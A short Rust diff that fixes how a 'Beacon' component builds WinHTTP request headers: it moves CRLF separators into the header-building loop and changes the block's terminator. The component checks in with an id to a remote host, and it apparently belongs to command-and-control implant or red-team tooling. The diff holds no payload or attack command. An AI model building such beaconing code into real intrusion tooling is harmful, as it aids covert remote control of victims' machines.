@@ -25,7 +25,7 @@ impl Beacon {
         info!("sending initial request to {hostname}:{port}");
         let id_bytes = self.id.to_le_bytes();
 
-        let headers = [HSTRING::from("Content-Type: application/octet-stream\r\n")];
+        let headers = [HSTRING::from("Content-Type: application/octet-stream")];
 
         let header_block = build_winhttp_headers(&headers);
 
@@ -52,11 +52,9 @@ fn build_winhttp_headers(headers: &[HSTRING]) -> Vec<u16> {
 
     for header in headers {
         buf.extend(header.as_wide());
-        buf.push(0u16);
+        buf.extend("\r\n".encode_utf16());
     }
 
-    // Double-null terminate the whole block
-    buf.push(0u16);
-
+    buf.push(0);
     buf
 }
